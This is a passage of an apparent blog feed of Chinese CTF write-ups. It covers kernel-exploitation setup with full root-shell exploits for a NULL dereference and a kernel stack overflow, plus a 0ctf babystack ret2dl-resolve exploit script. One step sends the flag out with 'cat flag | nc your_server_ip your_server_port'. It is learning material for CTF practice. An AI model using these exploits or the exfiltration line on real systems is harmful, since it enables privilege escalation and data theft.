class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      记录一下 HITB GSEC CTF 2018 里的once、babypwn和gundam三道PWN题，第一次进入国际比赛的线下赛，٩(๑&gt;◡&lt;๑)۶鸡冻。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CTF KETNEL PWN 入门记录</title>
    <link href="http://p4nda.top/2018/04/04/kernel-pwn-start/"/>
    <id>http://p4nda.top/2018/04/04/kernel-pwn-start/</id>
    <published>2018-04-04T08:46:04.000Z</published>
    <updated>2018-07-05T13:33:31.524Z</updated>
    
    <content type="html"><![CDATA[<p>从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。</p><p>最开始参考的是安全客上的两篇文章，都来自<a href="https://o0xmuhe.github.io/" target="_blank" rel="noopener">o0xmuhe</a></p><p><a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">Linux 内核漏洞利用教程（一）：环境配置</a></p><p><a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">Linux 内核漏洞利用教程（二）：两个Demo</a></p><p>本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…）</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>文中提到的安装依赖库及qemu时，在make menuconfig就很懵…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure><p>突然出现一大堆选项，而且并不知道是干嘛的…</p><p><img src="/img/kernel_pwn_begin/0.png" alt=""></p><p>最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的<strong>Save an Alternate Configuration File</strong>，然后选择默认命名的.config就可以了。</p><p>其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。</p><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><p>在编译busybox时，需要去掉</p><p>1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统</p><p><img src="/img/kernel_pwn_begin/1.png" alt=""></p><p>2 Networking Utilities -&gt; [] inetd (Internet超级服务器)</p><p><img src="/img/kernel_pwn_begin/2.png" alt=""></p><h2 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h2><p>qemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功）</p><p>首先，在busy-box的根目录下建立_install文件夹，作为文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure><p>在_install中的etc文件中增加inittab文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> etc</span><br><span class="line">touch inittab</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure><p>增加etc/init.d/rcS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir init.d</span><br><span class="line"><span class="built_in">cd</span> init.d</span><br><span class="line">touch rcS</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -</span><br></pre></td></tr></table></figure><p>建立完上述文件后，可以制作img镜像了。</p><p>在_install文件夹下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>启动gdb的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex <span class="string">"add-auto-load-safe-path <span class="variable">$(pwd)</span>"</span> \</span><br><span class="line">    -ex <span class="string">"file vmlinux"</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64:intel'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span> \</span><br><span class="line">    -ex <span class="string">'break start_kernel'</span> \</span><br><span class="line">    -ex <span class="string">'continue'</span> \</span><br><span class="line">    -ex <span class="string">'disconnect'</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span></span><br></pre></td></tr></table></figure><p>启动qemu的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init"</span> --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0</span><br></pre></td></tr></table></figure><h1 id="两个Demo"><a href="#两个Demo" class="headerlink" title="两个Demo"></a>两个Demo</h1><h2 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h2><p>编译内核及利用的exp、poc时，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>。</p><p>另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile </p><p>每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。</p><h2 id="NULL-Dereference"><a href="#NULL-Dereference" class="headerlink" title="NULL Dereference"></a>NULL Dereference</h2><p>这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。</p><p>因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。</p><p>和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。</p><p>附64位的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------shellcode.s -----------------</span><br><span class="line">xor %rax,%rax</span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81081030</span></span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81080e40</span></span><br><span class="line">ret</span><br><span class="line">------------------------<span class="built_in">exp</span>.c ---------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">"muhe"</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h2><p>这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了…</p><p>在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> eip,user_cs,user_eflags,user_sp,user_ss;</span><br><span class="line"><span class="keyword">char</span> bin_sh[] = <span class="string">"/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *rsp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">0x50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> j = <span class="number">0x78</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//"pushq %%ss\n"</span></span><br><span class="line">        <span class="string">"subq %2,%%rsp\n"</span></span><br><span class="line">        <span class="string">"movq %%ss,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rsp\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="comment">//"pushq %%cs\n"</span></span><br><span class="line">        <span class="string">"movq %%cs,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span>        </span><br><span class="line">        <span class="string">"pushq %0\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp,%1\n"</span></span><br><span class="line">        <span class="string">"addq %3,%%rsp"</span></span><br><span class="line">        :<span class="string">"=m"</span>(eip),<span class="string">"=r"</span>(user_sp),<span class="string">"=m"</span>(i),<span class="string">"=m"</span>(j)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080db0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080bc0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %0,%%rsp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span></span><br><span class="line">        :<span class="string">"=m"</span>(user_sp)</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">40</span>);</span><br><span class="line">    eip =(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) get_shell;</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">32</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。最开始参考的是安全客上的两篇文章，都来自o0xmuhe师傅的Linux 内核漏洞利用教程（一）：环境配置、Linux 内核漏洞利用教程（二）：两个Demo。本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差...）
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
  </entry>
  
  <entry>
    <title>0ctf 2018 PWN 部分题解</title>
    <link href="http://p4nda.top/2018/04/04/0ctf2018/"/>
    <id>http://p4nda.top/2018/04/04/0ctf2018/</id>
    <published>2018-04-04T07:42:05.000Z</published>
    <updated>2018-07-05T13:28:41.852Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。</p><p><img src="/img/0CTF2018/0.png" alt=""></p><p>靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。</p><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。</p><p>这篇博客对这个知识点讲的很清楚 <a href="http://www.freebuf.com/articles/system/149214.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149214.html</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment">#flag&#123;return_to_dlresolve_for_warming_up&#125;</span></span><br><span class="line">ct = string.ascii_letters+string.digits</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(io)</span>:</span></span><br><span class="line"><span class="comment">#io.recvuntil("+")</span></span><br><span class="line">s = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#io.recvuntil("== ")</span></span><br><span class="line"><span class="comment">#dst = io.recvuntil("\n")[:-1]</span></span><br><span class="line"><span class="keyword">print</span> repr(s)</span><br><span class="line"><span class="comment">#print repr(dst)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpre</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c2 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c3 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c4 <span class="keyword">in</span> ct:</span><br><span class="line">pre = c1 + c2 + c3 + c4</span><br><span class="line"><span class="comment">#hasho = hashlib.sha256(s+pre)</span></span><br><span class="line"><span class="comment">#print hasho.hexdigest()</span></span><br><span class="line"><span class="keyword">if</span> hashlib.sha256(s + pre).digest().startswith(<span class="string">'\0\0\0'</span>):<span class="comment">#hasho.hexdigest().lower().startswith('\0\0\0'):</span></span><br><span class="line"><span class="keyword">return</span> pre</span><br><span class="line">pre = getpre()</span><br><span class="line"><span class="keyword">print</span> pre</span><br><span class="line">io.send(pre)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">'202.120.7.202'</span>, <span class="number">6666</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">login(p)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_start = <span class="number">0x804a000</span></span><br><span class="line">leave_ret = <span class="number">0x8048455</span></span><br><span class="line">pppr = <span class="number">0x080484e9</span></span><br><span class="line">relplt = <span class="number">0x80482b0</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x80484e9')</span></span><br><span class="line">part1 = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(bss_start+<span class="number">0x800</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_start+<span class="number">0x800</span>) + p32(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part1 '</span> ,len(part1)</span><br><span class="line"><span class="comment">#p.send(part1)</span></span><br><span class="line">rop1 = p32(bss_start+<span class="number">0x800</span>+<span class="number">0x200</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_start + <span class="number">0x100</span>)  +p32(<span class="number">44</span>)</span><br><span class="line">rop1 += p32(<span class="number">0x80482f0</span>) + p32(bss_start+<span class="number">0x100</span> - relplt) +p32(pppr)+ p32(<span class="number">0x804a124</span>)<span class="comment"># + p32(0) + p32(bss_start + 0x200)  +p32(0x100)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part2 '</span> ,len(rop1)</span><br><span class="line"><span class="comment">#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) </span></span><br><span class="line"><span class="comment">#p.send(rop1)</span></span><br><span class="line"></span><br><span class="line">rop2 = p32(<span class="number">0x0804a00c</span>)+p32(<span class="number">0x0001f407</span>)+ p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x1ef0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">12</span>) + <span class="string">'system\0\0'</span></span><br><span class="line">rop3 = rop2 + <span class="string">'/bin/sh\0'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part3 '</span> ,len(rop3)</span><br><span class="line"><span class="comment">#rop = rop3 + 'a'*(0x100-len(rop3))</span></span><br><span class="line">p.send(part1+rop1+rop3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x080484eb : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080482e9 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x080484ea : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 0x00000006 (SYMTAB)                     0x80481cc</span></span><br><span class="line"><span class="string"> 0x0000000b (SYMENT)                     16 (bytes)</span></span><br><span class="line"><span class="string"> 0x6ffffff0 (VERSYM)                     0x804827c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x /4wx 0x80481cc+16</span></span><br><span class="line"><span class="string">0x80481dc:0x0000001a0x000000000x000000000x00000012</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>拿到shell，发现此题没有输出…  解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了…</p><p>最后看到flag，果然这种方法就是预期解… </p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是aligned<em>hook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\</em>_malloc_hook为one_gadget，从而拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 